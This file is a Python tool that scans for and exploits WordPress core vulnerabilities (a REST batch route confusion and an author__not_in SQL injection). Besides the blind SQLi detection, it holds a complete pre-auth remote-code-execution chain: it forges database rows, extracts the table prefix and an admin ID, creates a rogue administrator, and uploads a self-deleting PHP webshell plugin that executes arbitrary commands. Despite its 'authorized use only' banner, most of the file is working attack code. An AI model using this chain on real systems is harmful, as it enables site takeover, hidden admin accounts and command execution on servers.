#!/usr/bin/env python3
"""
wp2shell_check.py — detector & pre-auth RCE PoC for wp2shell
=============================================================
CVE-2026-63030 (REST /batch/v1 route confusion) + CVE-2026-60137
(WP_Query::author__not_in SQL injection) in WordPress core 6.9.0-6.9.4 / 7.0.0-7.0.1.

What it does
------------
**Detect (default):** Confirms the *unauthenticated SQL injection*, automatically, with
fallback on two independent axes so a single blocked path never yields a false negative:

  * **oracle** (`--method auto`): a fast **boolean row-count differential** (flip the injected
    WHERE true `1=1` vs false `1=12`, watch the confused posts query's row count collapse — no
    SLEEP) first; if it doesn't fire, the original **time-based SLEEP** differential.
  * **delivery** (`--delivery auto`): a **JSON** POST to the batch route first; if that isn't
    processed (e.g. an edge blocks `/wp-json`), a **`rest_route=/batch/v1` multipart form on
    `POST /`** (the exact operator request shape).

Each strategy is tried until one *confirms*; only when all come up empty is a target reported
negative. Override with `--method boolean|time` / `--delivery json|multipart` (`--multipart` is
an alias). Reads no data and changes nothing. `--proof` reads two harmless scalars (@@version,
current_user()) as evidence — still read-only.

**Exploit (`-c COMMAND`):** Full pre-auth RCE on stock WordPress — no FILE privilege, no
object cache, no plugins, no misconfigurations required. The chain:
  1. Blind SQLi confirms vulnerability and extracts table prefix / admin ID
  2. UNION row forgery via per_page=-1 split_the_query bypass injects fake posts
  3. oEmbed cache seeding turns read-only SQLi into real DB writes
  4. Changeset elevation + re-entrant parse_request runs in admin context
  5. POST /wp/v2/users creates a new administrator
  6. Login → plugin webshell upload → command execution → self-cleanup

The stock-default RCE mechanism (oEmbed → changeset → re-entry) was researched by
Mustafa Can İPEKÇİ (nukedx), building on the route confusion + SQLi discovered by
Adam Kues (Assetnote / Searchlight Cyber).

Authorized use only
-------------------
Run this against systems you own or are explicitly authorized to test. Remote (non-loopback)
targets require --authorized.

Usage
-----
    python3 wp2shell_check.py http://target[:port]           # detect (auto oracle + delivery)
    python3 wp2shell_check.py http://target --method time    # force the SLEEP oracle
    python3 wp2shell_check.py http://target --delivery multipart  # force rest_route form on /
    python3 wp2shell_check.py http://target --proof          # + read @@version as evidence
    python3 wp2shell_check.py http://target -c "id"          # full pre-auth RCE
    python3 wp2shell_check.py -f hosts.txt --authorized --json
    python3 wp2shell_check.py http://127.0.0.1:8093          # local lab (no --authorized needed)

Status values:
  vulnerable        - actively confirmed via the injection (batch confusion, 6.9.0-7.0.1)
  affected_version  - fingerprinted version is in an affected range but the active check did
                      not fire (e.g. 6.8.0-6.8.5 has the SQLi sink but not the 6.9+ confusion
                      delivery; or a WAF/edge blocked the probe). Version-based, not proof.
  not_vulnerable    - active check negative and version outside the affected ranges

Exit codes: 0 = needs attention (vulnerable or affected_version), 1 = not vulnerable, 2 = error.
Follows redirects while preserving the POST body; ignores TLS errors (curl -k).
"""
import argparse
import base64
import concurrent.futures
import hashlib
import html as html_mod
import io
import json
import re
import secrets
import ssl
import statistics
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile
from collections import Counter
from http.cookiejar import CookieJar

__version__ = "2.2.1"


class _KeepPost(urllib.request.HTTPRedirectHandler):
    """Follow redirects but PRESERVE the POST method and body. urllib's default handler
    downgrades a redirected POST to a bodyless GET (301/302/303), which would silently
    drop the batch payload when a site redirects http->https or to a canonical host and
    produce a false negative. We keep POSTing to the Location instead. Loop protection
    (max_redirections) is still enforced by the parent."""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        if req.get_method() == "POST" and code in (301, 302, 303, 307, 308):
            hdrs = {k: v for k, v in req.header_items() if k.lower() != "content-length"}
            return urllib.request.Request(newurl, data=req.data, headers=hdrs,
                                          origin_req_host=req.origin_req_host,
                                          unverifiable=True, method="POST")
        return super().redirect_request(req, fp, code, msg, headers, newurl)


class Target:
    def __init__(self, base, timeout=15, proxy=None, sleep=4.0, route="auto", delivery="auto"):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.sleep = float(sleep)
        self.route = route
        # delivery: "auto" (probe JSON, fall back to multipart if JSON isn't processed),
        # "json" (POST body to /wp-json|rest_route batch), or "multipart" (rest_route form on /).
        self.delivery = delivery
        self.multipart = (delivery == "multipart")  # current on-the-wire delivery for _send()
        self._delivery_resolved = (delivery != "auto")
        self._proxy = proxy
        self.batch = None        # resolved endpoint URL (canonical, post-redirect)
        self._mp_ep = None       # resolved multipart endpoint (root vs /index.php)
        self._base = 0.0         # measured baseline round-trip (set by detect(); used by the oracle)
        self._normalized = False # whether the base host/scheme has been canonicalized
        # Ignore TLS verification (self-signed / expired / hostname-mismatch certs are
        # common on test targets). Equivalent to `curl -k`.
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener_handlers = [urllib.request.HTTPSHandler(context=ctx), _KeepPost()]
        if proxy:
            opener_handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        else:
            opener_handlers.append(urllib.request.ProxyHandler({}))  # ignore env proxies
        self.opener = urllib.request.build_opener(*opener_handlers)

    UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

    def _normalize_base(self):
        """Follow redirects on the root once and pin the canonical scheme://host, so the
        batch POST goes straight to the final host (http->https, apex->www, etc.) instead
        of relying on a redirect for every probe. Only scheme+host are taken (never a
        redirected path), so REST routes stay correct."""
        if self._normalized:
            return
        self._normalized = True
        try:
            req = urllib.request.Request(self.base + "/", headers={"User-Agent": self.UA})
            with self.opener.open(req, timeout=self.timeout) as r:
                u = urllib.parse.urlparse(r.geturl())
                if u.scheme and u.netloc:
                    canon = "%s://%s" % (u.scheme, u.netloc)
                    if canon != self.base:
                        self.base = canon
                        self.batch = None  # re-resolve endpoint against the canonical host
        except Exception:
            pass

    # -- HTTP ---------------------------------------------------------------
    def _raw(self, url, data=None, headers=None, method=None):
        hdrs = dict(headers or {})
        hdrs.setdefault("User-Agent", self.UA)
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        t0 = time.perf_counter()
        try:
            with self.opener.open(req, timeout=self.timeout) as r:
                body = r.read()
                return r.status, time.perf_counter() - t0, body, r.geturl()
        except urllib.error.HTTPError as e:
            return e.code, time.perf_counter() - t0, e.read(), getattr(e, "url", url)

    def _endpoints(self):
        if self.route == "wp-json":
            return [self.base + "/wp-json/batch/v1"]
        if self.route == "rest-route":
            return [self.base + "/?rest_route=/batch/v1"]
        # auto: rest_route works without pretty permalinks; wp-json needs them
        return [self.base + "/?rest_route=/batch/v1", self.base + "/wp-json/batch/v1"]

    # -- payload ------------------------------------------------------------
    # The injected value breaks out of `post_author NOT IN ( <value> )` and wraps SLEEP
    # in a derived table:  (SELECT 1 FROM (SELECT SLEEP(n))x)  -- so MySQL materializes
    # and evaluates it once, independent of the number of rows the posts query returns.
    # A bare `NOT IN (SELECT SLEEP(n))` / `OR SLEEP(n)` gets optimized away and never
    # executes on some managed WordPress hosts, which reads as a false negative. The
    # nested subquery avoids that.
    @staticmethod
    def _envelope(author_exclude):
        """Nested batch (route confusion) that lands `author_exclude` in WP_Query::author__not_in."""
        enc = urllib.parse.quote(author_exclude, safe="")
        inner = {"requests": [
            {"method": "POST", "path": "///"},                            # misalignment trigger
            {"method": "GET",  "path": "/wp/v2/users?author_exclude=" + enc},
            {"method": "GET",  "path": "/wp/v2/posts"},                   # supplies get_items handler
        ]}
        return {"requests": [
            {"method": "POST", "path": "/v2/categories", "body": {"name": "x"}},
            {"method": "POST", "path": "///", "body": {"name": "x"}},
            {"method": "POST", "path": "/wp/v2/posts", "body": inner},    # self-call onto batch handler
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}

    # -- multipart (rest_route form) delivery -------------------------------
    # WordPress reads the public query var `rest_route` from $_POST in WP::parse_request(),
    # so the whole nested batch can ride as multipart form fields on POST / — no JSON, no
    # /wp-json path. This is the exact shape of the observed operator request and slips past
    # edges that filter JSON bodies to /wp-json/batch/v1.
    @staticmethod
    def _flatten_fields(envelope):
        """Flatten the nested batch envelope into ordered PHP-array form fields, e.g.
        requests[0][method], requests[2][body][requests][1][path]. Order is preserved,
        which the desync depends on."""
        fields = []

        def rec(name, val):
            if isinstance(val, dict):
                for k, v in val.items():
                    rec("%s[%s]" % (name, k), v)
            elif isinstance(val, list):
                for i, v in enumerate(val):
                    rec("%s[%d]" % (name, i), v)
            else:
                fields.append((name, "" if val is None else str(val)))

        for i, req in enumerate(envelope["requests"]):
            rec("requests[%d]" % i, req)
        return fields

    @staticmethod
    def _multipart_encode(fields):
        boundary = "----WebKitFormBoundary%s" % secrets.token_hex(8)
        out = []
        for name, value in fields:
            out.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
                        % (boundary, name, value)).encode())
        out.append(("--%s--\r\n" % boundary).encode())
        return "multipart/form-data; boundary=%s" % boundary, b"".join(out)

    def _send(self, author_exclude):
        """Deliver one injection carrying <author_exclude> into author__not_in.
        Returns (status, elapsed, body_bytes). Honors self.multipart."""
        self._normalize_base()
        env = self._envelope(author_exclude)
        if self.multipart:
            fields = [("rest_route", "/batch/v1"), ("validation", "normal")]
            fields += self._flatten_fields(env)
            ctype, body = self._multipart_encode(fields)
            hdrs = {"Content-Type": ctype}
            if self._mp_ep is None:
                for ep in (self.base + "/", self.base + "/index.php"):
                    st, el, resp, _ = self._raw(ep, data=body, headers=hdrs, method="POST")
                    if st in (200, 207):
                        self._mp_ep = ep
                        return st, el, resp
                self._mp_ep = self.base + "/"  # nothing processed; keep root, timing/rows decide
            st, el, resp, _ = self._raw(self._mp_ep, data=body, headers=hdrs, method="POST")
            return st, el, resp
        # JSON delivery (default)
        body = json.dumps(env).encode()
        headers = {"Content-Type": "application/json"}
        if self.batch is None:
            # resolve which endpoint form the site accepts (a processed batch answers 207/200);
            # pin the post-redirect URL so later probes hit the canonical endpoint directly.
            for ep in self._endpoints():
                st, _, _, final = self._raw(ep, data=body, headers=headers, method="POST")
                if st in (200, 207):
                    self.batch = final
                    break
            if self.batch is None:
                self.batch = self._endpoints()[0]  # fall back; timing still decides
        st, el, resp, _ = self._raw(self.batch, data=body, headers=headers, method="POST")
        return st, el, resp

    def probe(self, author_exclude):
        """Send one injection into author__not_in. Returns (status, elapsed)."""
        st, el, _ = self._send(author_exclude)
        return st, el

    @staticmethod
    def _sleep_payload(seconds):
        return "0) OR (SELECT 1 FROM (SELECT SLEEP(%g))x)-- -" % seconds

    # -- detection ----------------------------------------------------------
    def detect(self, rounds=3):
        fast = statistics.median(self.probe(self._sleep_payload(0))[1] for _ in range(rounds))
        slow = statistics.median(self.probe(self._sleep_payload(self.sleep))[1] for _ in range(rounds))
        self._base = fast
        delta = slow - fast
        # vulnerable if the slow path tracks our injected sleep and the fast path did not
        vulnerable = delta >= (self.sleep * 0.6) and fast < (self.sleep * 0.5)
        return {"fast": fast, "slow": slow, "delta": delta, "vulnerable": vulnerable}

    # -- boolean (row-count) detection -------------------------------------
    # No SLEEP: flip the injected WHERE true (1=1) vs false (1=12) and read the confused
    # posts query's row count. True -> rows returned (the `-- -` also truncates the
    # status/pagination clauses, so X-WP-Total climbs); false -> zero rows. A stable
    # true>0 / false==0 differential is the injection firing. Faster than timing and
    # immune to SLEEP being filtered or optimized away on managed hosts.
    @staticmethod
    def _bool_payload(truth):
        return "0) AND 1=%d-- -" % (1 if truth else 12)

    @staticmethod
    def _harvest(body):
        """Walk a (possibly nested) batch response; return (max X-WP-Total seen or None,
        count of post-like objects) across every sub-response. Robust to desync index shifts."""
        try:
            doc = json.loads(body)
        except Exception:
            return None, 0
        totals, posts = [], [0]

        def walk(o):
            if isinstance(o, dict):
                h = o.get("headers")
                if isinstance(h, dict) and "X-WP-Total" in h:
                    try:
                        totals.append(int(h["X-WP-Total"]))
                    except (TypeError, ValueError):
                        pass
                for v in o.values():
                    walk(v)
            elif isinstance(o, list):
                if o and all(isinstance(e, dict) for e in o) and any(
                        "id" in e and ("title" in e or "content" in e or "slug" in e) for e in o):
                    posts[0] += sum(1 for e in o if "id" in e)
                for e in o:
                    walk(e)

        walk(doc)
        return (max(totals) if totals else None), posts[0]

    @staticmethod
    def _has_responses(body):
        """True if <body> parses as a processed batch (a 'responses' array anywhere).
        Distinguishes 'delivery reached the batch handler' from 'blocked / not WordPress'."""
        try:
            doc = json.loads(body)
        except Exception:
            return False

        def walk(o):
            if isinstance(o, dict):
                if isinstance(o.get("responses"), list):
                    return True
                return any(walk(v) for v in o.values())
            if isinstance(o, list):
                return any(walk(e) for e in o)
            return False

        return walk(doc)

    def detect_boolean(self):
        """Row-count differential. Returns a dict incl. {'vulnerable': bool, 'processed': bool}.
        'processed' means the current delivery reached the batch handler (so a negative is a
        real negative, not a blocked delivery that the caller should retry another way)."""
        try:
            _, _, tb = self._send(self._bool_payload(True))
            _, _, fb = self._send(self._bool_payload(False))
        except urllib.error.URLError:
            return {"vulnerable": False, "processed": False, "signal": "none",
                    "true_total": None, "false_total": None,
                    "true_posts": 0, "false_posts": 0, "true_len": 0, "false_len": 0}
        t_total, t_posts = self._harvest(tb)
        f_total, f_posts = self._harvest(fb)
        by_total = (t_total is not None and f_total is not None and t_total > 0 and f_total == 0)
        by_posts = (t_posts > 0 and f_posts == 0)
        by_len = ((len(tb) - len(fb)) > 200 and f_posts == 0 and t_posts > 0)
        signal = ("x-wp-total" if by_total else "post-count" if by_posts
                  else "body-length" if by_len else "none")
        processed = self._has_responses(tb) or self._has_responses(fb)
        return {"vulnerable": bool(by_total or by_posts or by_len), "processed": processed,
                "signal": signal, "true_total": t_total, "false_total": f_total,
                "true_posts": t_posts, "false_posts": f_posts,
                "true_len": len(tb), "false_len": len(fb)}

    # -- delivery resolution + method orchestration ------------------------
    def _set_delivery(self, name):
        self.multipart = (name == "multipart")

    def _delivery_name(self):
        return "multipart" if self.multipart else "json"

    def _batch_processes(self):
        """Cheap benign probe: does the *current* delivery reach the batch handler?"""
        try:
            st, _, body = self._send("0")
        except urllib.error.URLError:
            return False
        return st in (200, 207) and self._has_responses(body)

    def _resolve_delivery(self):
        """For delivery=auto, pin JSON if it reaches the batch handler, else multipart.
        Used by the RCE/proof paths that call detect()/oracle directly."""
        if self._delivery_resolved:
            return
        self._delivery_resolved = True
        self._set_delivery("json")
        if self._batch_processes():
            return
        self._set_delivery("multipart")
        if self._batch_processes():
            return
        self._set_delivery("json")  # neither processed; timing/rows will read negative anyway

    def detect_auto(self, method="auto", rounds=3):
        """Automatic detection with fallback across both axes:
          oracle:   boolean (fast, no SLEEP)  ->  time (SLEEP differential)
          delivery: json  ->  multipart (rest_route form), when json isn't processed
        Tries each until one CONFIRMS; returns the confirming (method, delivery). A genuine
        failure of one strategy (error, delivery blocked, oracle gives no signal) falls
        through to the next; only when all configured strategies come up empty is it negative."""
        deliveries = ["json", "multipart"] if self.delivery == "auto" else [self.delivery]
        boo_by_delivery = {}

        # 1) boolean oracle across deliveries (each is cheap: 2 requests)
        if method in ("auto", "boolean"):
            for d in deliveries:
                self._set_delivery(d)
                boo = self.detect_boolean()
                boo_by_delivery[d] = boo
                if boo["vulnerable"]:
                    return {"vulnerable": True, "method": "boolean", "delivery": d, "boolean": boo}

        # 2) time oracle. Run it once, on a delivery already proven to reach the batch handler
        #    (avoids paying the SLEEP cost twice); fall back to the first candidate otherwise.
        last_time = None
        if method in ("auto", "time"):
            proc = [d for d in deliveries if boo_by_delivery.get(d, {}).get("processed")]
            for d in (proc[:1] or deliveries[:1]):
                self._set_delivery(d)
                det = self.detect(rounds=rounds)
                last_time = (d, det)
                if det["vulnerable"]:
                    return {"vulnerable": True, "method": "time", "delivery": d, "time": det}

        # nothing confirmed
        neg_delivery = (last_time[0] if last_time else
                        (deliveries[0] if deliveries else self._delivery_name()))
        self._set_delivery(neg_delivery)
        return {"vulnerable": False, "method": None, "delivery": neg_delivery,
                "boolean": boo_by_delivery, "time": (last_time[1] if last_time else None)}

    # -- bounded read-only proof -------------------------------------------
    def _oracle(self, cond, unit=0.6):
        payload = "0) OR (SELECT 1 FROM (SELECT IF((%s),SLEEP(%g),0))x)-- -" % (cond, unit)
        _, el = self.probe(payload)
        return el > (self._base + unit * 0.6)   # relative to measured baseline (latency-safe)

    def read_scalar(self, expr, maxlen=40, unit=0.6):
        v = "COALESCE((%s),'')" % expr
        lo, hi = 0, maxlen
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._oracle("CHAR_LENGTH(%s)>=%d" % (v, mid), unit):
                lo = mid
            else:
                hi = mid - 1
        out = ""
        for pos in range(1, lo + 1):
            a, b = 32, 126
            while a < b:
                mid = (a + b + 1) // 2
                if self._oracle("ASCII(SUBSTRING(%s,%d,1))>=%d" % (v, pos, mid), unit):
                    a = mid
                else:
                    b = mid - 1
            out += chr(a)
        return out

    def read_int(self, query, unit=0.6):
        expr = "COALESCE((%s),0)" % query
        lo, hi = 0, 1
        while self._oracle("%s >= %d" % (expr, hi), unit):
            lo, hi = hi, hi * 2
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._oracle("%s >= %d" % (expr, mid), unit):
                lo = mid
            else:
                hi = mid - 1
        return lo

    # -- RCE: row forgery + oEmbed → changeset → re-entry → admin creation ----
    # Chain researched by Mustafa Can İPEKÇİ (nukedx),
    # building on the route confusion + SQLi by Adam Kues (Assetnote).

    PRIMER = "http://:"
    EMBED_ATTR = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'

    def _rce_send(self, inner_requests, timeout=None):
        payload = {"requests": [
            {"method": "POST", "path": self.PRIMER},
            {"method": "POST", "path": "/wp/v2/posts",
             "body": {"requests": inner_requests}},
            {"method": "POST", "path": "/batch/v1"},
        ]}
        ep = self.batch or self._endpoints()[0]
        body = json.dumps(payload).encode()
        hdrs = {"Content-Type": "application/json", "User-Agent": self.UA}
        req = urllib.request.Request(ep, data=body, headers=hdrs, method="POST")
        try:
            with self.opener.open(req, timeout=timeout or self.timeout) as resp:
                return resp.read()
        except urllib.error.HTTPError as e:
            return e.read()

    @staticmethod
    def _hex(value):
        return "0x%s" % value.encode().hex() if value else "''"

    def _post_row(self, post_id, content, title, status, name, parent, post_type):
        h = self._hex
        return ",".join((
            str(post_id), "1",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"),
            h(content), h(title), "''",
            h(status), h("closed"), h("closed"), "''",
            h(name), "''", "''",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"), "''",
            str(parent), "''", "0",
            h(post_type), "''", "0",
        ))

    def _forge(self, rows, extra_requests=()):
        query = ("1) AND 1=0 UNION ALL SELECT "
                 + " UNION ALL SELECT ".join(rows) + " -- -")
        self._rce_send([
            {"method": "GET", "path": self.PRIMER},
            {"method": "GET", "path": "/wp/v2/widgets?"
             + urllib.parse.urlencode({"author_exclude": query, "per_page": -1,
                                       "orderby": "none", "context": "view"})},
            {"method": "GET", "path": "/wp/v2/posts"},
            *extra_requests,
        ], timeout=60)

    def exploit(self, command):
        """Full pre-auth RCE. Returns (username, password, command_output)."""
        self._normalize_base()

        # 1. published post for oEmbed anchor
        try:
            with self.opener.open(
                urllib.request.Request(
                    self.base + "/?rest_route=/wp/v2/posts&per_page=1&_fields=link",
                    headers={"User-Agent": self.UA}), timeout=15) as resp:
                items = json.loads(resp.read())
        except Exception:
            items = []
        if not items or not items[0].get("link"):
            raise RuntimeError("no published post for oEmbed anchor")

        link = urllib.parse.urlsplit(items[0]["link"])
        token = secrets.token_hex(6)
        embed_urls = [
            urllib.parse.urlunsplit((
                link.scheme, link.netloc, link.path, link.query,
                "%s%d" % (token, i)))
            for i in range(3)]

        # 2. seed 3 oEmbed caches (forged post with [embed] shortcodes → real DB writes)
        sys.stderr.write("[*] seeding oEmbed caches ...\n")
        seed_content = "".join(
            '[embed width="500" height="750"]%s[/embed]' % u for u in embed_urls)
        self._forge([self._post_row(
            0, seed_content, "seed", "publish", "seed", 0, "post")])

        # 3. extract table prefix, admin ID, seeded cache post IDs
        sys.stderr.write("[*] extracting table prefix ...\n")
        posts_table = self.read_scalar(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
            "WHERE TABLE_SCHEMA=DATABASE() "
            "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
            "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1", 64)
        if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
            raise RuntimeError("could not resolve posts table (%r)" % posts_table)
        prefix = posts_table[:-5]
        sys.stderr.write("[+] table prefix: %s\n" % (prefix or "(empty)"))

        sys.stderr.write("[*] extracting admin user ID ...\n")
        admin_id = self.read_int(
            "SELECT u.ID FROM `%susers` u JOIN `%susermeta` m "
            "ON m.user_id=u.ID WHERE m.meta_key=%s "
            "AND INSTR(m.meta_value,%s)>0 "
            "ORDER BY u.ID LIMIT 1" % (
                prefix, prefix,
                self._hex(prefix + "capabilities"),
                self._hex('s:13:"administrator";b:1;')))
        if admin_id < 1:
            raise RuntimeError("could not locate an administrator")
        sys.stderr.write("[+] admin ID: %d\n" % admin_id)

        sys.stderr.write("[*] recovering oEmbed cache post IDs ...\n")
        cache_ids = []
        for u in embed_urls:
            key = hashlib.md5((u + self.EMBED_ATTR).encode()).hexdigest()
            pid = self.read_int(
                "SELECT ID FROM `%s` WHERE post_type=0x6f656d6265645f6361636865 "
                "AND post_name=0x%s ORDER BY ID DESC LIMIT 1" % (
                    posts_table, key.encode().hex()))
            if pid < 1:
                raise RuntimeError("oEmbed cache seeding failed")
            cache_ids.append(pid)
        if len(set(cache_ids)) != 3:
            raise RuntimeError("oEmbed cache IDs not distinct")
        sys.stderr.write("[+] cache IDs: %s\n" % cache_ids)

        # 4. forge changeset elevation + re-entrant parse_request, create admin
        username = "w2s_%s" % token
        password = "W2s!%s" % secrets.token_urlsafe(15)
        email = "%s@wp2shell.local" % username
        outer = 1800000000 + secrets.randbelow(100000000)
        nav_id, inner_id = outer + 1, outer + 2

        changeset = json.dumps({
            "nav_menu_item[%d]" % nav_id: {
                "value": {
                    "object_id": 0, "object": "", "menu_item_parent": 0,
                    "position": 0, "type": "custom", "title": "proof",
                    "url": "https://github.com/dinosn/wp2shell-lab",
                    "target": "", "attr_title": "", "description": "proof",
                    "classes": "", "xfn": "", "status": "publish",
                    "nav_menu_term_id": 0, "_invalid": False,
                },
                "type": "nav_menu_item", "user_id": admin_id,
            }
        }, separators=(",", ":"))

        poisoned = (
            self._post_row(0,
                '[embed width="500" height="750"]%s[/embed]' % embed_urls[1],
                "trigger", "publish", "trigger", 0, "post"),
            self._post_row(cache_ids[0], changeset, "changeset", "future",
                str(uuid.uuid4()), outer, "customize_changeset"),
            self._post_row(outer, "outer", "outer", "draft",
                "outer", cache_ids[0], "post"),
            self._post_row(cache_ids[1], "", "cache", "publish",
                "cache", cache_ids[0], "post"),
            self._post_row(nav_id, "nav", "nav", "publish",
                "nav", cache_ids[2], "nav_menu_item"),
            self._post_row(cache_ids[2], "parse", "parse", "parse",
                "parse", inner_id, "request"),
            self._post_row(inner_id, "inner", "inner", "draft",
                "inner", cache_ids[2], "post"),
        )
        new_admin = {"username": username, "email": email,
                     "password": password, "roles": ["administrator"]}

        sys.stderr.write("[*] forging changeset + re-entry, creating administrator ...\n")
        self._forge(poisoned, extra_requests=[
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
        ])

        # 5. login and deploy self-cleaning webshell plugin
        sys.stderr.write("[+] administrator created: %s:%s  (%s)\n"
                         % (username, password, email))
        sys.stderr.write("[*] logging in, deploying webshell, executing command ...\n")

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sh = [urllib.request.HTTPSHandler(context=ctx),
              urllib.request.HTTPCookieProcessor(CookieJar()), _KeepPost()]
        if self._proxy:
            sh.append(urllib.request.ProxyHandler(
                {"http": self._proxy, "https": self._proxy}))
        else:
            sh.append(urllib.request.ProxyHandler({}))
        session = urllib.request.build_opener(*sh)

        session.open(urllib.request.Request(
            self.base + "/wp-login.php",
            headers={"User-Agent": self.UA}), timeout=15).read()
        session.open(urllib.request.Request(
            self.base + "/wp-login.php",
            data=urllib.parse.urlencode({
                "log": username, "pwd": password, "wp-submit": "Log In",
                "redirect_to": self.base + "/wp-admin/",
                "testcookie": "1"}).encode(),
            headers={"User-Agent": self.UA},
            method="POST"), timeout=30).read()

        with session.open(urllib.request.Request(
                self.base + "/wp-admin/users.php",
                headers={"User-Agent": self.UA}), timeout=30) as resp:
            users_page = resp.read().decode(errors="replace")
        if username not in users_page:
            raise RuntimeError("admin login failed (user not created?)")

        slug = "wp2shell-%s" % secrets.token_hex(6)
        route = secrets.token_hex(12)
        marker = secrets.token_hex(12)
        php = (
            "<?php\n"
            "/* Plugin Name: %s */\n"
            "add_action('rest_api_init', function () {\n"
            "    register_rest_route('wp2shell/v1', '/%s', array(\n"
            "        'methods' => 'POST', 'permission_callback' => '__return_true',\n"
            "        'callback' => function ($r) {\n"
            "            ob_start(); passthru(base64_decode($r->get_param('c')).' 2>&1');\n"
            "            $o = ob_get_clean();\n"
            "            require_once ABSPATH.'wp-admin/includes/plugin.php';\n"
            "            deactivate_plugins(plugin_basename(__FILE__), true);\n"
            "            @unlink(__FILE__);\n"
            "            return new WP_REST_Response(array(\n"
            "                'marker' => '%s', 'output' => $o));\n"
            "        },\n"
            "    ));\n"
            "});\n" % (slug, route, marker)).encode()

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("%s/%s.php" % (slug, slug), php)

        with session.open(urllib.request.Request(
                self.base + "/wp-admin/plugin-install.php?tab=upload",
                headers={"User-Agent": self.UA}), timeout=30) as resp:
            page = resp.read().decode(errors="replace")
        nonce = re.search(r'name="_wpnonce" value="([^"]+)"', page)
        if not nonce:
            raise RuntimeError("plugin-upload nonce not found")

        boundary = "----wp2shell%s" % secrets.token_hex(12)
        body = b"".join((
            ("--%s\r\nContent-Disposition: form-data; "
             "name=\"_wpnonce\"\r\n\r\n%s\r\n" % (boundary, nonce.group(1))).encode(),
            ("--%s\r\nContent-Disposition: form-data; "
             "name=\"_wp_http_referer\"\r\n\r\n"
             "/wp-admin/plugin-install.php?tab=upload\r\n" % boundary).encode(),
            ("--%s\r\nContent-Disposition: form-data; "
             "name=\"pluginzip\"; filename=\"%s.zip\"\r\n"
             "Content-Type: application/zip\r\n\r\n" % (boundary, slug)).encode(),
            buf.getvalue(),
            ("\r\n--%s--\r\n" % boundary).encode(),
        ))
        with session.open(urllib.request.Request(
                self.base + "/wp-admin/update.php?action=upload-plugin",
                data=body,
                headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary,
                         "User-Agent": self.UA},
                method="POST"), timeout=60) as resp:
            install_page = resp.read().decode(errors="replace")

        activate = re.search(
            r'href="([^"]*plugins\.php\?action=activate[^"]*)"', install_page)
        if not activate:
            raise RuntimeError("plugin install/activation link not found")
        session.open(urllib.request.Request(
            urllib.parse.urljoin(self.base + "/wp-admin/",
                                html_mod.unescape(activate.group(1))),
            headers={"User-Agent": self.UA}), timeout=30).read()

        cmd_req = urllib.request.Request(
            self.base + "/?rest_route=/wp2shell/v1/%s" % route,
            data=json.dumps({
                "c": base64.b64encode(command.encode()).decode()}).encode(),
            headers={"Content-Type": "application/json",
                     "User-Agent": self.UA},
            method="POST")
        with self.opener.open(cmd_req, timeout=60) as resp:
            result = json.loads(resp.read())
        if result.get("marker") != marker:
            raise RuntimeError("webshell did not respond correctly")

        return username, password, result["output"]


# -- version fingerprint (best-effort, read-only) --------------------------

# Full chain = batch-route confusion (CVE-2026-63030) + SQLi. Only these ranges are
# actively testable: the confusion is what bypasses input sanitization to reach the sink.
FULL_CHAIN = [((6, 9, 0), (6, 9, 4)), ((7, 0, 0), (7, 0, 1))]
# SQLi sink alone (CVE-2026-60137). The version is affected, but the confusion delivery
# does NOT exist here, so there is no unauth active check on this branch (fixed 6.8.6).
SINK_ONLY = [((6, 8, 0), (6, 8, 5))]


def _ver_tuple(s):
    m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", s)
    return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0)) if m else None


def fingerprint_version(t):
    # Cache-bust every read: a CDN (Cloudflare/Akamai) in front of WordPress caches the HTML
    # homepage, so a plain fetch can return a STALE generator meta from before an auto-update —
    # which misfingerprints a patched site as an affected version. A unique query param + no-cache
    # headers force an origin MISS. Core-asset ?ver= (block-library/emoji/wp-embed) is the most
    # reliable signal since it is stamped with the running WP version at build time.
    cb = "wpcb%s" % secrets.token_hex(4)
    nocache = {"Cache-Control": "no-cache", "Pragma": "no-cache"}
    core_asset = (r'(?:block-library/style(?:\.min)?\.css|wp-emoji-release(?:\.min)?\.js'
                  r'|wp-embed(?:\.min)?\.js)\?ver=([0-9]+\.[0-9]+(?:\.[0-9]+)?)')
    for path, pat in (("/", core_asset),
                      ("/", r'content="WordPress\s+([0-9.]+)"'),
                      ("/feed/", r"<generator>\s*https?://wordpress\.org/\?v=([0-9.]+)"),
                      ("/readme.html", r"Version\s+([0-9.]+)")):
        url = t.base + path + ("&" if "?" in path else "?") + cb
        try:
            _, _, body, _ = t._raw(url, headers=nocache)
            m = re.search(pat, body.decode("utf-8", "replace"))
            if m:
                return m.group(1)
        except Exception:
            pass
    return None


def version_verdict(ver):
    vt = _ver_tuple(ver) if ver else None
    if not vt:
        return "unknown"
    if any(lo <= vt <= hi for lo, hi in FULL_CHAIN):
        return "affected-full-chain"
    if any(lo <= vt <= hi for lo, hi in SINK_ONLY):
        return "affected-sqli-sink-only"
    return "outside-affected-range"


